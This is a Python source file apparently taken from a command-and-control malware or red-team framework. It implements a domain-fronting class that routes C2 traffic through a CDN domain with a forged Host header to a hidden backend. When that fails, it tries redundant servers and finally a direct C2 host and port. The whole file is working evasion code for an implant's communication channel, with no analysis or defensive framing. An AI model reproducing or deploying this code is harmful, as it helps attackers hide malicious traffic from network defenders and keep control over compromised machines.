import requests
import random
from urllib.parse import urlparse

class DomainFronting:
    def __init__(self, config_manager):
        self.config = config_manager
        self.cdn_domain = self.config.get('c2.domain_fronting.cdn_domain')
        self.backend_domain = self.config.get('c2.domain_fronting.backend_domain')
        self.redundant_servers = self.config.get('c2.redundancy', [])
        
    def make_request(self, endpoint, data=None, headers=None, method='GET'):
        """Make a request using domain fronting"""
        # Try domain fronting first
        if self.cdn_domain and self.backend_domain:
            try:
                return self._fronted_request(endpoint, data, headers, method)
            except Exception as e:
                print(f"[!] Domain fronting failed: {str(e)}")
                
        # Fall back to redundant servers
        for server in self.redundant_servers:
            try:
                url = f"{server}{endpoint}"
                if method.upper() == 'GET':
                    response = requests.get(url, headers=headers, timeout=10)
                else:
                    response = requests.post(url, json=data, headers=headers, timeout=10)
                    
                if response.status_code == 200:
                    return response
            except Exception as e:
                print(f"[!] Server {server} failed: {str(e)}")
                continue
                
        # If all else fails, use the direct C2 address
        host = self.config.get('c2.host', '0.0.0.0')
        port = self.config.get('c2.http_port', 8081)
        url = f"http://{host}:{port}{endpoint}"
        
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=10)
        else:
            response = requests.post(url, json=data, headers=headers, timeout=10)
            
        return response
        
    def _fronted_request(self, endpoint, data=None, headers=None, method='GET'):
        """Make a request using domain fronting"""
        # Prepare headers for domain fronting
        fronted_headers = headers.copy() if headers else {}
        fronted_headers['Host'] = self.backend_domain
        
        # Make the request to the CDN domain
        url = f"https://{self.cdn_domain}{endpoint}"
        
        if method.upper() == 'GET':
            response = requests.get(url, headers=fronted_headers, timeout=10)
        else:
            response = requests.post(url, json=data, headers=fronted_headers, timeout=10)
        return response

    def get_available_domains(self):
        """Get list of available domains for domain fronting"""
        domains = []
        
        if self.cdn_domain:
            domains.append(self.cdn_domain)
            
        domains.extend(self.redundant_servers)
        
            # Add direct C2 address as last resort
        host = self.config.get('c2.host', '0.0.0.0')
        port = self.config.get('c2.http_port', 8081)
        domains.append(f"http://{host}:{port}")
        
        return domains
